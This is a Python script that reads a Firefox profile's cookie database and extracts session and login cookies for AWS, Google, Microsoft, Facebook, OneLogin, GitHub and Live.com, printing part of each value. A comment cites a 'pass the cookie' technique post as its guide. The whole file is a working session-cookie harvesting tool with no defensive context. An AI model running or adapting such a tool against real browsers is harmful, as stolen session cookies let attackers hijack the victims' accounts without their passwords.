import profile
import os
import sqlite3


profile = "dt2oh9n7.default-release" # is chnage from system to system
firefoxPath = os.path.join("C:\\Users\\hepos\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles",profile,"cookies.sqlite")

conn = sqlite3.connect(firefoxPath)
c = conn.cursor()
c.execute("SELECT * FROM moz_cookies")

# The method fetches all (or all remaining) rows of a query result set and returns a list of tuples. If no more rows are available, it returns an empty list.
data = c.fetchall()


# source: https://embracethered.com/blog/posts/passthecookie/
# this site will help you to filter the cookies to idenitify the things that are actually
# of interest.

cookies = {
    ".amazon.com": ["aws[userInfo", "aws-creds"],
    ".google.com": ["OSID", "HSID", "SID", "SSID", "APISID", "SAPISID", "LSID"],
    ".microsoftonline.com": ["ESTSAUTHPERSISTENT"],
    ".facebook.com": ["c_user", "cs"],
    ".onelogin.com": ["sub_session_onelogin.com"],
    ".github.com": ["user_session"],
    ".live.com": ["RPSSecAuth"],
}

for cookie in data:
    for domain in cookies:
        if cookie[4].endswith(domain) and cookie[2] in cookies[domain]:
            print("%s %s %s" % (cookie[4], cookie[2], cookie[3][:20]))

            
